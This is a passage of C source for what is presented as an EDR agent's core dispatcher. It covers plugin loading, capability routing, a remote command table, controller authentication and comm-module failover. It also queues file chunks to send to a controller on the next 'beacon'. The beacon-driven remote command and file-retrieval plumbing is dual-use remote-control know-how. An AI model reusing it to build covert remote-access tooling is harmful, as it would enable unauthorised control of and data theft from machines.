/* Required for clock_gettime, CLOCK_REALTIME on older glibc */
#define _POSIX_C_SOURCE 200809L

/*
 * edr_dispatcher.c — Core dispatcher implementation.
 *
 * Responsibilities:
 *   1. Plugin registry: dlopen, ABI check, init/shutdown lifecycle.
 *   2. Capability routing: maintain per-capability sorted plugin list.
 *   3. Command demuxer: command_id string → interface function call.
 *   4. Event loop: heartbeat timer, health report timer, inbound recv pump.
 *
 * Platform: POSIX (Linux/macOS). Windows port replaces dlopen with
 * LoadLibrary and pthread with Win32 threads — all behind thin wrappers.
 */

#include "edr_dispatcher.h"

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>
#include <dirent.h>
#include <errno.h>

#ifdef _WIN32
#  define WIN32_LEAN_AND_MEAN
#  include <windows.h>
/* dlopen / dlsym / dlclose / dlerror shims */
#  define RTLD_NOW   0
#  define RTLD_LOCAL 0
static inline void       *edr_dlopen(const char *p, int f)  { (void)f; return (void *)LoadLibraryA(p); }
static inline void       *edr_dlsym(void *h, const char *s) { return (void *)(uintptr_t)GetProcAddress((HMODULE)h, s); }
static inline int         edr_dlclose(void *h)               { return FreeLibrary((HMODULE)h) ? 0 : -1; }
static inline const char *edr_dlerror(void) {
    static char _ebuf[256];
    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                   NULL, GetLastError(), 0, _ebuf, (DWORD)sizeof(_ebuf), NULL);
    return _ebuf;
}
#  define dlopen  edr_dlopen
#  define dlsym   edr_dlsym
#  define dlclose edr_dlclose
#  define dlerror edr_dlerror
/* clock_gettime shim */
#  ifndef CLOCK_REALTIME
#    define CLOCK_REALTIME 0
#  endif
static inline int edr_clock_gettime(int clk_id, struct timespec *tp) {
    (void)clk_id;
    FILETIME ft; GetSystemTimeAsFileTime(&ft);
    unsigned long long t = ((unsigned long long)ft.dwHighDateTime << 32) | ft.dwLowDateTime;
    t -= 116444736000000000ULL;
    tp->tv_sec  = (time_t)(t / 10000000ULL);
    tp->tv_nsec = (long)((t % 10000000ULL) * 100);
    return 0;
}
#  define clock_gettime(id, ts) edr_clock_gettime(id, ts)
/* Override plugin extension for Windows */
#  undef  PLUGIN_EXT
#  define PLUGIN_EXT ".dll"

/* ── Win32 pthread shim (no libwinpthread dependency) ──────────────────────
 * Maps the subset of pthreads used in this file to Win32 primitives.       */
typedef CRITICAL_SECTION   pthread_mutex_t;
typedef CONDITION_VARIABLE pthread_cond_t;
typedef HANDLE             pthread_t;
typedef void *pthread_mutexattr_t;
typedef void *pthread_condattr_t;
typedef void *pthread_attr_t;

static inline int pthread_mutex_init(pthread_mutex_t *m, const pthread_mutexattr_t *a)
    { (void)a; InitializeCriticalSection(m); return 0; }
static inline int pthread_mutex_lock(pthread_mutex_t *m)
    { EnterCriticalSection(m); return 0; }
static inline int pthread_mutex_unlock(pthread_mutex_t *m)
    { LeaveCriticalSection(m); return 0; }
static inline int pthread_mutex_destroy(pthread_mutex_t *m)
    { DeleteCriticalSection(m); return 0; }

static inline int pthread_cond_init(pthread_cond_t *c, const pthread_condattr_t *a)
    { (void)a; InitializeConditionVariable(c); return 0; }
static inline int pthread_cond_wait(pthread_cond_t *c, pthread_mutex_t *m)
    { return SleepConditionVariableCS(c, m, INFINITE) ? 0 : -1; }
static inline int pthread_cond_timedwait(pthread_cond_t *c, pthread_mutex_t *m,
                                          const struct timespec *abs)
{
    /* Convert absolute timespec to a relative millisecond timeout. */
    struct timespec now; edr_clock_gettime(0, &now);
    long long ms = ((long long)(abs->tv_sec  - now.tv_sec)  * 1000)
                 + ((long long)(abs->tv_nsec - now.tv_nsec) / 1000000);
    if (ms < 0) ms = 0;
    return SleepConditionVariableCS(c, m, (DWORD)ms) ? 0 : -1;
}
static inline int pthread_cond_signal(pthread_cond_t *c)
    { WakeConditionVariable(c); return 0; }
static inline int pthread_cond_destroy(pthread_cond_t *c)
    { (void)c; return 0; }

typedef struct { void *(*fn)(void *); void *arg; } _pt_ctx_t;
static DWORD WINAPI _pt_trampoline(LPVOID p) {
    _pt_ctx_t ctx = *(_pt_ctx_t *)p; free(p);
    ctx.fn(ctx.arg); return 0;
}
static inline int pthread_create(pthread_t *t, const pthread_attr_t *a,
                                  void *(*fn)(void *), void *arg)
{
    (void)a;
    _pt_ctx_t *ctx = (_pt_ctx_t *)malloc(sizeof(*ctx));
    if (!ctx) return -1;
    ctx->fn = fn; ctx->arg = arg;
    *t = CreateThread(NULL, 0, _pt_trampoline, ctx, 0, NULL);
    if (!*t) { free(ctx); return -1; }
    return 0;
}
static inline int pthread_join(pthread_t t, void **ret)
    { (void)ret; WaitForSingleObject(t, INFINITE); CloseHandle(t); return 0; }
/* ── end pthread shim ─────────────────────────────────────────────────────*/

#else
#  include <dlfcn.h>
#  include <unistd.h>
#  include <pthread.h>
#  include <sys/types.h>
#  include <sys/wait.h>
#endif

/* -------------------------------------------------------------------------
 * Internal constants
 * -------------------------------------------------------------------------*/
#define MAX_PLUGINS          32
#define COMMAND_TABLE_SIZE  128   /* hash table buckets for command dispatch */
#ifndef PLUGIN_EXT
#  define PLUGIN_EXT        ".so"   /* overridden to ".dll" by Windows shim above */
#endif

/* -------------------------------------------------------------------------
 * Internal plugin slot
 * -------------------------------------------------------------------------*/
typedef struct {
    edr_plugin_manifest_t manifest;
    void                 *dl_handle;   /* dlopen() handle */
    int                   active;      /* 1 if loaded and healthy */
    uint64_t              calls_ok;
    uint64_t              calls_err;
    char                  last_error[256];
} plugin_slot_t;

/* -------------------------------------------------------------------------
 * Capability routing slot — one per EDR_CAP_* bit
 * -------------------------------------------------------------------------*/
typedef struct {
    /* Sorted by manifest.priority ascending; [0] is the primary plugin. */
    plugin_slot_t *ordered[MAX_PLUGINS];
    uint32_t       count;
} cap_route_t;

/* -------------------------------------------------------------------------
 * Command dispatch table entry
 * -------------------------------------------------------------------------*/
typedef edr_status_t (*dispatch_fn_t)(edr_dispatcher_t   *d,
                                       const edr_message_t *msg,
                                       edr_completion_cb_t  cb,
                                       void               *ctx);

typedef struct cmd_entry {
    char            command_id[64];
    dispatch_fn_t   fn;
    struct cmd_entry *next;  /* chained hash collision */
} cmd_entry_t;

/* -------------------------------------------------------------------------
 * Dispatcher struct (opaque outside this TU)
 * -------------------------------------------------------------------------*/
struct edr_dispatcher {
    edr_dispatcher_config_t cfg;

    /* Plugin registry */
    plugin_slot_t  plugins[MAX_PLUGINS];
    uint32_t       plugin_count;
    pthread_mutex_t plugins_mu;

    /* Per-capability routing tables */
    cap_route_t    routes[8];  /* One per EDR_CAP_* bit position 0..7 */

    /* Command dispatch table */
    cmd_entry_t   *cmd_table[COMMAND_TABLE_SIZE];
    pthread_mutex_t cmd_table_mu;

    /* Plugin services object (same for all plugins) */
    edr_plugin_services_t services;

    /* Event loop */
    pthread_t      event_thread;
    int            running;       /* atomic int, written under loop_mu */
    pthread_mutex_t loop_mu;
    pthread_cond_t  loop_cond;

    /* Heartbeat / health timers */
    time_t         last_heartbeat;
    time_t         last_health_report;

    /* File download queue (for sending file chunks on next beacon) */
    char          *file_chunks[256];  /* Queue of base64-encoded chunks */
    uint32_t       file_chunk_count;
    char           file_path[512];    /* Associated file path */
    pthread_mutex_t file_queue_mu;

    /* VPN module callback for queueing beacon messages */
    edr_enqueue_msg_cb_t enqueue_msg_cb;
};

/* -------------------------------------------------------------------------
 * Forward declarations of internal helpers
 * -------------------------------------------------------------------------*/
static void  dispatcher_log(edr_dispatcher_t *d, edr_log_level_t lvl,
                             const char *comp, const char *fmt, ...);
static void  register_all_commands(edr_dispatcher_t *d);
static void  insert_route(edr_dispatcher_t *d, uint32_t cap_bit,
                           plugin_slot_t *slot);
static uint32_t cmd_hash(const char *s);
static void  cmd_table_insert(edr_dispatcher_t *d, const char *id,
                               dispatch_fn_t fn);
static dispatch_fn_t cmd_table_lookup(edr_dispatcher_t *d, const char *id);
static void *event_loop_thread(void *arg);

/* -------------------------------------------------------------------------
 * Plugin services callbacks (these are the function pointers given to plugins)
 * -------------------------------------------------------------------------*/
static void *svc_alloc(size_t bytes)  { return malloc(bytes); }
static void  svc_free(void *ptr)      { free(ptr); }

/* emit_event is set after dispatcher is constructed; use a static trampoline */
static edr_dispatcher_t *g_dispatcher_for_svc = NULL; /* one dispatcher for now */

static edr_status_t svc_emit_event(const char *event_type,
                                    const char *json_payload)
{
    if (!g_dispatcher_for_svc) return EDR_ERR_NOT_INIT;
    const edr_iface_event_t *ev = edr_get_event(g_dispatcher_for_svc);
    if (!ev || !ev->emit) return EDR_ERR_NOT_IMPL;

    edr_event_t e;
    memset(&e, 0, sizeof(e));
    e.occurred_at = time(NULL);
    strncpy(e.source, "plugin", sizeof(e.source) - 1);
    strncpy(e.json, json_payload ? json_payload : "{}", sizeof(e.json) - 1);
    /* Map string event_type to enum; default to CUSTOM. */
    e.type = EDR_EVENT_CUSTOM;

    return ev->emit(&e);
}

/* -------------------------------------------------------------------------
 * Lifecycle
 * -------------------------------------------------------------------------*/

edr_dispatcher_t *edr_dispatcher_create(const edr_dispatcher_config_t *cfg)
{
    if (!cfg) return NULL;

    edr_dispatcher_t *d = calloc(1, sizeof(*d));
    if (!d) return NULL;

    d->cfg = *cfg;

    pthread_mutex_init(&d->plugins_mu, NULL);
    pthread_mutex_init(&d->cmd_table_mu, NULL);
    pthread_mutex_init(&d->loop_mu, NULL);
    pthread_cond_init(&d->loop_cond, NULL);
    pthread_mutex_init(&d->file_queue_mu, NULL);

    d->services.log         = cfg->log;   /* may be NULL */
    d->services.alloc       = svc_alloc;
    d->services.free        = svc_free;
    d->services.emit_event  = svc_emit_event;

    g_dispatcher_for_svc = d;

    register_all_commands(d);

    dispatcher_log(d, EDR_LOG_INFO, "dispatcher", "Dispatcher created (agent=%s)",
                   cfg->identity.agent_id);
    return d;
}

edr_status_t edr_dispatcher_start(edr_dispatcher_t *d)
{
    if (!d) return EDR_ERR_INVALID_ARG;

    /* Auto-load plugins from directory if configured. */
    if (d->cfg.plugin_dir) {
        DIR *dir = opendir(d->cfg.plugin_dir);
        if (!dir) {
            dispatcher_log(d, EDR_LOG_WARN, "dispatcher",
                           "Cannot open plugin_dir '%s': %s",
                           d->cfg.plugin_dir, strerror(errno));
        } else {
            struct dirent *ent;
            while ((ent = readdir(dir)) != NULL) {
                const char *name = ent->d_name;
                size_t nlen = strlen(name);
                size_t elen = strlen(PLUGIN_EXT);
                if (nlen > elen &&
                    strcmp(name + nlen - elen, PLUGIN_EXT) == 0)
                {
                    char path[4096];
                    snprintf(path, sizeof(path), "%s/%s",
                             d->cfg.plugin_dir, name);
                    edr_status_t st = edr_dispatcher_load_plugin(d, path);
                    if (st != EDR_OK) {
                        dispatcher_log(d, EDR_LOG_WARN, "dispatcher",
                                       "Failed to load plugin '%s': %d",
                                       path, st);
                    }
                }
            }
            closedir(dir);
        }
    }

    /* Register dispatcher with VPN module if loaded (for file chunk pulling) */
#ifdef _WIN32
    {
        HMODULE vpn_dll = GetModuleHandleA("cynosure_vpn_comm.dll");
        if (!vpn_dll) vpn_dll = GetModuleHandleA("cynosure_vpn_comm");
        if (vpn_dll) {
            typedef void (*vpn_set_dispatcher_fn)(void *, void *);
            vpn_set_dispatcher_fn set_disp = (vpn_set_dispatcher_fn)
                GetProcAddress(vpn_dll, "vpn_set_dispatcher");
            if (set_disp) {
                set_disp(d, (void *)edr_dispatcher_get_file_chunks);
            }
        }
    }
#endif

    /* Authenticate with the best available auth plugin. */
    const edr_iface_auth_t *auth = edr_get_auth(d);
    if (auth && auth->authenticate) {
        edr_auth_token_t tok;
        memset(&tok, 0, sizeof(tok));
        edr_status_t st = auth->authenticate(&d->cfg.identity, &tok, NULL, NULL);
        if (st != EDR_OK) {
            dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                           "Authentication failed: %d", st);
            return st;
        }
        dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                       "Authentication OK, token expires %ld", (long)tok.expires_at);
    }

    /* Connect transport. */
    const edr_iface_comm_t *comm = edr_get_comm(d);
    if (comm && comm->connect) {
        edr_status_t st = comm->connect(&d->cfg.controller_endpoint,
                                         NULL, NULL);
        if (st != EDR_OK) {
            dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                           "Transport connect failed: %d", st);
            return st;
        }
        /* Wire inbound messages to our dispatcher. */
        if (comm->set_recv_handler) {
            /* The recv handler is a static trampoline; see below. */
            extern void dispatcher_recv_handler(const edr_message_t *, void *);
            comm->set_recv_handler(dispatcher_recv_handler, d);
        }
    } else {
        dispatcher_log(d, EDR_LOG_WARN, "dispatcher",
                       "No comm transport plugin loaded — running offline");
    }

    /* Start event loop thread. */
    pthread_mutex_lock(&d->loop_mu);
    d->running = 1;
    pthread_mutex_unlock(&d->loop_mu);

    if (pthread_create(&d->event_thread, NULL, event_loop_thread, d) != 0) {
        dispatcher_log(d, EDR_LOG_FATAL, "dispatcher",
                       "Failed to start event thread: %s", strerror(errno));
        return EDR_ERR_GENERIC;
    }

    dispatcher_log(d, EDR_LOG_INFO, "dispatcher", "Dispatcher started");
    pthread_join(d->event_thread, NULL); /* blocks until stop() */
    return EDR_OK;
}

edr_status_t edr_dispatcher_stop(edr_dispatcher_t *d)
{
    if (!d) return EDR_ERR_INVALID_ARG;

    dispatcher_log(d, EDR_LOG_INFO, "dispatcher", "Stop requested");

    pthread_mutex_lock(&d->loop_mu);
    d->running = 0;
    pthread_cond_signal(&d->loop_cond);
    pthread_mutex_unlock(&d->loop_mu);

    /* Flush event stream. */
    const edr_iface_event_t *ev = edr_get_event(d);
    if (ev && ev->flush) ev->flush(5000);

    /* Disconnect transport. */
    const edr_iface_comm_t *comm = edr_get_comm(d);
    if (comm && comm->disconnect) comm->disconnect(NULL, NULL);

    /* Shutdown all plugins in reverse load order. */
    pthread_mutex_lock(&d->plugins_mu);
    for (int i = (int)d->plugin_count - 1; i >= 0; i--) {
        plugin_slot_t *slot = &d->plugins[i];
        if (slot->active && slot->manifest.shutdown) {
            slot->manifest.shutdown();
        }
        if (slot->dl_handle) dlclose(slot->dl_handle);
        slot->active = 0;
    }
    d->plugin_count = 0;
    pthread_mutex_unlock(&d->plugins_mu);

    dispatcher_log(d, EDR_LOG_INFO, "dispatcher", "Dispatcher stopped");
    return EDR_OK;
}

void edr_dispatcher_destroy(edr_dispatcher_t *d)
{
    if (!d) return;
    pthread_mutex_destroy(&d->plugins_mu);
    pthread_mutex_destroy(&d->cmd_table_mu);
    pthread_mutex_destroy(&d->loop_mu);
    pthread_cond_destroy(&d->loop_cond);

    /* Free command table entries. */
    for (int i = 0; i < COMMAND_TABLE_SIZE; i++) {
        cmd_entry_t *e = d->cmd_table[i];
        while (e) {
            cmd_entry_t *next = e->next;
            free(e);
            e = next;
        }
    }
    free(d);
}

/* -------------------------------------------------------------------------
 * Plugin registry
 * -------------------------------------------------------------------------*/

edr_status_t edr_dispatcher_register_plugin(edr_dispatcher_t      *d,
                                             edr_plugin_entry_fn_t  entry_fn)
{
    if (!d || !entry_fn) return EDR_ERR_INVALID_ARG;

    pthread_mutex_lock(&d->plugins_mu);
    if (d->plugin_count >= MAX_PLUGINS) {
        pthread_mutex_unlock(&d->plugins_mu);
        return EDR_ERR_BUSY;
    }

    plugin_slot_t *slot = &d->plugins[d->plugin_count];
    memset(slot, 0, sizeof(*slot));
    slot->dl_handle = NULL;

    edr_status_t st = entry_fn(&slot->manifest);
    if (st != EDR_OK) { pthread_mutex_unlock(&d->plugins_mu); return st; }

    if (slot->manifest.abi_version.major != EDR_INTERFACE_VERSION_MAJOR) {
        pthread_mutex_unlock(&d->plugins_mu);
        return EDR_ERR_PLUGIN_MISMATCH;
    }

    if (slot->manifest.init) {
        st = slot->manifest.init(&d->services, &d->cfg.identity);
        if (st != EDR_OK) { pthread_mutex_unlock(&d->plugins_mu); return st; }
    }

    slot->active = 1;
    d->plugin_count++;

    for (int bit = 0; bit < 8; bit++) {
        if (slot->manifest.capabilities & (1u << bit))
            insert_route(d, bit, slot);
    }

    dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                   "Registered built-in plugin '%s' (caps=0x%02x)",
                   slot->manifest.name, slot->manifest.capabilities);

    pthread_mutex_unlock(&d->plugins_mu);
    return EDR_OK;
}

edr_status_t edr_dispatcher_load_plugin(edr_dispatcher_t *d, const char *path)
{
    if (!d || !path) return EDR_ERR_INVALID_ARG;

    pthread_mutex_lock(&d->plugins_mu);
    if (d->plugin_count >= MAX_PLUGINS) {
        pthread_mutex_unlock(&d->plugins_mu);
        return EDR_ERR_BUSY;
    }

    void *handle = dlopen(path, RTLD_NOW | RTLD_LOCAL);
    if (!handle) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "dlopen(%s) failed: %s", path, dlerror());
        pthread_mutex_unlock(&d->plugins_mu);
        return EDR_ERR_IO;
    }

    /* dlsym returns void*; converting to a function pointer is
     * technically undefined in C11 but unavoidable with POSIX dlsym.
     * We use memcpy to avoid the -Wpedantic diagnostic. */
    void *sym = dlsym(handle, EDR_PLUGIN_ENTRY_SYMBOL);
    edr_plugin_entry_fn_t entry_fn;
    memcpy(&entry_fn, &sym, sizeof(entry_fn));
    if (!entry_fn) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "Symbol '%s' not found in '%s'",
                       EDR_PLUGIN_ENTRY_SYMBOL, path);
        dlclose(handle);
        pthread_mutex_unlock(&d->plugins_mu);
        return EDR_ERR_PLUGIN_MISMATCH;
    }

    plugin_slot_t *slot = &d->plugins[d->plugin_count];
    memset(slot, 0, sizeof(*slot));
    slot->dl_handle = handle;

    edr_status_t st = entry_fn(&slot->manifest);
    if (st != EDR_OK) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "Plugin entry() returned %d for '%s'", st, path);
        dlclose(handle);
        pthread_mutex_unlock(&d->plugins_mu);
        return st;
    }

    /* ABI version check — major must match exactly. */
    if (slot->manifest.abi_version.major != EDR_INTERFACE_VERSION_MAJOR) {
        dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                       "Plugin '%s' ABI major %u != dispatcher major %u",
                       slot->manifest.name,
                       slot->manifest.abi_version.major,
                       EDR_INTERFACE_VERSION_MAJOR);
        dlclose(handle);
        pthread_mutex_unlock(&d->plugins_mu);
        return EDR_ERR_PLUGIN_MISMATCH;
    }

    /* Initialize plugin. */
    if (slot->manifest.init) {
        st = slot->manifest.init(&d->services, &d->cfg.identity);
        if (st != EDR_OK) {
            dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                           "Plugin '%s' init() failed: %d",
                           slot->manifest.name, st);
            dlclose(handle);
            pthread_mutex_unlock(&d->plugins_mu);
            return st;
        }
    }

    slot->active = 1;
    d->plugin_count++;

    /* Register capabilities into routing table. */
    for (int bit = 0; bit < 8; bit++) {
        if (slot->manifest.capabilities & (1u << bit)) {
            insert_route(d, bit, slot);
        }
    }

    dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                   "Loaded plugin '%s' v%u.%u (caps=0x%02x priority=%u)",
                   slot->manifest.name,
                   slot->manifest.plugin_version.major,
                   slot->manifest.plugin_version.minor,
                   slot->manifest.capabilities,
                   slot->manifest.priority);

    pthread_mutex_unlock(&d->plugins_mu);
    return EDR_OK;
}

edr_status_t edr_dispatcher_unload_plugin(edr_dispatcher_t *d,
                                           const char       *plugin_name)
{
    if (!d || !plugin_name) return EDR_ERR_INVALID_ARG;

    pthread_mutex_lock(&d->plugins_mu);
    for (uint32_t i = 0; i < d->plugin_count; i++) {
        plugin_slot_t *slot = &d->plugins[i];
        if (slot->active &&
            strcmp(slot->manifest.name, plugin_name) == 0)
        {
            if (slot->manifest.shutdown) slot->manifest.shutdown();
            dlclose(slot->dl_handle);
            slot->active = 0;
            /* Remove from routing tables. */
            for (int bit = 0; bit < 8; bit++) {
                cap_route_t *rt = &d->routes[bit];
                uint32_t w = 0;
                for (uint32_t r = 0; r < rt->count; r++) {
                    if (rt->ordered[r] != slot)
                        rt->ordered[w++] = rt->ordered[r];
                }
                rt->count = w;
            }
            dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                           "Unloaded plugin '%s'", plugin_name);
            pthread_mutex_unlock(&d->plugins_mu);
            return EDR_OK;
        }
    }
    pthread_mutex_unlock(&d->plugins_mu);
    return EDR_ERR_GENERIC;
}

uint32_t edr_dispatcher_list_plugins(edr_dispatcher_t *d,
                                      char            (*out_names)[EDR_PLUGIN_NAME_LEN],
                                      uint32_t          cap)
{
    if (!d) return 0;
    pthread_mutex_lock(&d->plugins_mu);
    uint32_t n = 0;
    for (uint32_t i = 0; i < d->plugin_count && n < cap; i++) {
        if (d->plugins[i].active) {
            strncpy(out_names[n], d->plugins[i].manifest.name,
                    EDR_PLUGIN_NAME_LEN - 1);
            out_names[n][EDR_PLUGIN_NAME_LEN - 1] = '\0';
            n++;
        }
    }
    pthread_mutex_unlock(&d->plugins_mu);
    return n;
}

/* -------------------------------------------------------------------------
 * Runtime module switching (for TUI module selection)
 * -------------------------------------------------------------------------*/

uint32_t edr_dispatcher_list_comm_modules(edr_dispatcher_t *d,
                                          edr_comm_module_t *out,
                                          uint32_t cap) {
    if (!d || !out) return 0;

    pthread_mutex_lock(&d->plugins_mu);
    cap_route_t *rt = &d->routes[0];  /* Bit 0 = EDR_CAP_COMM_TRANSPORT */
    uint32_t count = 0;

    for (uint32_t i = 0; i < rt->count && count < cap; i++) {
        plugin_slot_t *slot = rt->ordered[i];
        if (slot && slot->active) {
            strncpy(out[count].name, slot->manifest.name,
                    EDR_PLUGIN_NAME_LEN - 1);
            out[count].name[EDR_PLUGIN_NAME_LEN - 1] = '\0';
            out[count].priority = slot->manifest.priority;
            out[count].is_active = (i == 0);  /* First in sorted list is active */
            /* Check if connected */
            const edr_iface_comm_t *comm = NULL;
            if (i == 0) {
                comm = slot->manifest.get_comm ? slot->manifest.get_comm() : NULL;
                out[count].is_connected = (comm && comm->is_connected) ?
                    comm->is_connected() : 0;
            } else {
                out[count].is_connected = 0;  /* Inactive modules never connected */
            }
            count++;
        }
    }

    pthread_mutex_unlock(&d->plugins_mu);
    return count;
}

const char *edr_dispatcher_get_active_comm_module(edr_dispatcher_t *d) {
    if (!d) return NULL;

    pthread_mutex_lock(&d->plugins_mu);
    cap_route_t *rt = &d->routes[0];  /* Bit 0 = EDR_CAP_COMM_TRANSPORT */

    if (rt->count > 0 && rt->ordered[0]) {
        const char *name = rt->ordered[0]->manifest.name;
        pthread_mutex_unlock(&d->plugins_mu);
        return name;
    }

    pthread_mutex_unlock(&d->plugins_mu);
    return NULL;
}

/* Register callback for VPN module to enqueue beacon messages */
void edr_dispatcher_set_enqueue_callback(edr_dispatcher_t *d, edr_enqueue_msg_cb_t cb) {
    if (!d) return;
    d->enqueue_msg_cb = cb;
}

/* Retrieve and clear queued file chunks (called by VPN module's build_body) */
uint32_t edr_dispatcher_get_file_chunks(edr_dispatcher_t *d,
                                         char **chunks, uint32_t max_chunks) {
    if (!d || !chunks || max_chunks == 0) return 0;

    pthread_mutex_lock(&d->file_queue_mu);
    uint32_t count = (d->file_chunk_count < max_chunks) ? d->file_chunk_count : max_chunks;
    for (uint32_t i = 0; i < count; i++) {
        chunks[i] = d->file_chunks[i];
        d->file_chunks[i] = NULL;
    }
    d->file_chunk_count = 0;
    pthread_mutex_unlock(&d->file_queue_mu);
    return count;
}

edr_status_t edr_dispatcher_switch_comm_module(edr_dispatcher_t *d,
                                               const char *module_name) {
    if (!d || !module_name) return EDR_ERR_INVALID_ARG;

    pthread_mutex_lock(&d->plugins_mu);
    cap_route_t *rt = &d->routes[0];  /* Bit 0 = EDR_CAP_COMM_TRANSPORT */

    /* Find the requested module in the routing list */
    uint32_t target_idx = UINT32_MAX;
    for (uint32_t i = 0; i < rt->count; i++) {
        if (rt->ordered[i] &&
            strcmp(rt->ordered[i]->manifest.name, module_name) == 0) {
            target_idx = i;
            break;
        }
    }

    if (target_idx == UINT32_MAX) {
        dispatcher_log(d, EDR_LOG_WARN, "dispatcher",
                       "Module '%s' not found", module_name);
        pthread_mutex_unlock(&d->plugins_mu);
        return EDR_ERR_GENERIC;
    }

    if (target_idx == 0) {
        /* Already active */
        pthread_mutex_unlock(&d->plugins_mu);
        return EDR_OK;
    }

    /* Disconnect current transport */
    plugin_slot_t *old_plugin = rt->ordered[0];
    const edr_iface_comm_t *old_comm = NULL;
    if (old_plugin) {
        old_comm = old_plugin->manifest.get_comm ?
            old_plugin->manifest.get_comm() : NULL;
        if (old_comm && old_comm->disconnect) {
            old_comm->disconnect(NULL, NULL);
        }
    }

    /* Move target module to front of list (becomes active) */
    plugin_slot_t *target = rt->ordered[target_idx];
    for (uint32_t i = target_idx; i > 0; i--) {
        rt->ordered[i] = rt->ordered[i - 1];
    }
    rt->ordered[0] = target;

    dispatcher_log(d, EDR_LOG_INFO, "dispatcher",
                   "Switched comm module to '%s'", module_name);

    /* Connect new transport */
    const edr_iface_comm_t *new_comm = target->manifest.get_comm ?
        target->manifest.get_comm() : NULL;

    pthread_mutex_unlock(&d->plugins_mu);

    if (new_comm && new_comm->connect) {
        edr_status_t st = new_comm->connect(&d->cfg.controller_endpoint,
                                            NULL, NULL);
        if (st != EDR_OK) {
            dispatcher_log(d, EDR_LOG_ERROR, "dispatcher",
                           "Failed to connect with '%s': %d",
                           module_name, st);
            /* Fallback: switch back to previous module */
            pthread_mutex_lock(&d->plugins_mu);
            for (uint32_t i = 0; i < target_idx; i++) {
                rt->ordered[i] = rt->ordered[i + 1];
            }
            rt->ordered[target_idx] = target;
            pthread_mutex_unlock(&d->plugins_mu);

            if (old_comm && old_comm->connect) {
                old_comm->connect(&d->cfg.controller_endpoint, NULL, NULL);
            }
            dispatcher_log(d, EDR_LOG_WARN, "dispatcher",
                           "Failover: reverted to previous module");
            return st;
        }

        /* Wire inbound messages */
        if (new_comm->set_recv_handler) {
            extern void dispatcher_recv_handler(const edr_message_t *, void *);
            new_comm->set_recv_handler(dispatcher_recv_handler, d);
        }
    }

    return EDR_OK;
}

/* -------------------------------------------------------------------------
 * Capability routing
 * -------------------------------------------------------------------------*/

static void insert_route(edr_dispatcher_t *d, uint32_t cap_bit,
                          plugin_slot_t *slot)
{
    cap_route_t *rt = &d->routes[cap_bit];
    if (rt->count >= MAX_PLUGINS) return;

    /* Insertion sort by priority. */
    uint32_t i = rt->count++;
    rt->ordered[i] = slot;
    while (i > 0 &&
           rt->ordered[i]->manifest.priority <
           rt->ordered[i-1]->manifest.priority)
    {
        plugin_slot_t *tmp = rt->ordered[i-1];
        rt->ordered[i-1]  = rt->ordered[i];
        rt->ordered[i]    = tmp;
        i--;
    }
}

/* Return the highest-priority active plugin interface for cap_bit.
 * Falls back to the next plugin if the accessor returns NULL. */
#define DEFINE_GET_IFACE(fn_name, cap_flag_bit, iface_type, accessor_fn)    \
const iface_type *fn_name(edr_dispatcher_t *d) {                            \
    if (!d) return NULL;                                                      \
    cap_route_t *rt = &d->routes[cap_flag_bit];                              \
    for (uint32_t i = 0; i < rt->count; i++) {                              \
        plugin_slot_t *s = rt->ordered[i];                                   \
        if (!s->active) continue;                                             \
        if (!s->manifest.accessor_fn) continue;                              \
        const iface_type *iface = s->manifest.accessor_fn();                 \
        if (iface) return iface;                                              \
    }                                                                         \
    return NULL;                                                              \
}

/* cap bit positions match the EDR_CAP_* shift values */
DEFINE_GET_IFACE(edr_get_comm,        0, edr_iface_comm_t,        get_comm)
DEFINE_GET_IFACE(edr_get_file_ops,    1, edr_iface_file_ops_t,    get_file_ops)
DEFINE_GET_IFACE(edr_get_scan,        2, edr_iface_scan_t,        get_scan)
DEFINE_GET_IFACE(edr_get_event,       3, edr_iface_event_t,       get_event)
DEFINE_GET_IFACE(edr_get_remediation, 4, edr_iface_remediation_t, get_remediation)
DEFINE_GET_IFACE(edr_get_config,      5, edr_iface_config_t,      get_config)
DEFINE_GET_IFACE(edr_get_health,      6, edr_iface_health_t,      get_health)
DEFINE_GET_IFACE(edr_get_auth,        7, edr_iface_auth_t,        get_auth)

/* -------------------------------------------------------------------------
 * Command dispatch table
 * -------------------------------------------------------------------------*/

static uint32_t cmd_hash(const char *s)
{
    uint32_t h = 5381;
    while (*s) h = ((h << 5) + h) ^ (uint8_t)*s++;
    return h % COMMAND_TABLE_SIZE;
}

static void cmd_table_insert(edr_dispatcher_t *d, const char *id,
                              dispatch_fn_t fn)
{
    cmd_entry_t *e = calloc(1, sizeof(*e));
    if (!e) return;
    strncpy(e->command_id, id, sizeof(e->command_id) - 1);
    e->fn = fn;

    uint32_t h = cmd_hash(id);
    pthread_mutex_lock(&d->cmd_table_mu);
    e->next = d->cmd_table[h];
    d->cmd_table[h] = e;
    pthread_mutex_unlock(&d->cmd_table_mu);
}

static dispatch_fn_t cmd_table_lookup(edr_dispatcher_t *d, const char *id)
{
    uint32_t h = cmd_hash(id);
    pthread_mutex_lock(&d->cmd_table_mu);
    for (cmd_entry_t *e = d->cmd_table[h]; e; e = e->next) {
        if (strcmp(e->command_id, id) == 0) {
            dispatch_fn_t fn = e->fn;
            pthread_mutex_unlock(&d->cmd_table_mu);
            return fn;
        }
    }
    pthread_mutex_unlock(&d->cmd_table_mu);
    return NULL;
}

/* -------------------------------------------------------------------------
 * Per-command dispatch handlers (one per command_id)
 * -------------------------------------------------------------------------*/

static edr_status_t cmd_scan_process(edr_dispatcher_t *d,
                                      const edr_message_t *msg,
                                      edr_completion_cb_t cb, void *ctx)
{
    const edr_iface_scan_t *scan = edr_get_scan(d);
    if (!scan || !scan->scan) return EDR_ERR_NOT_IMPL;

    edr_scan_request_t req = {
        .type    = EDR_SCAN_PROCESS,
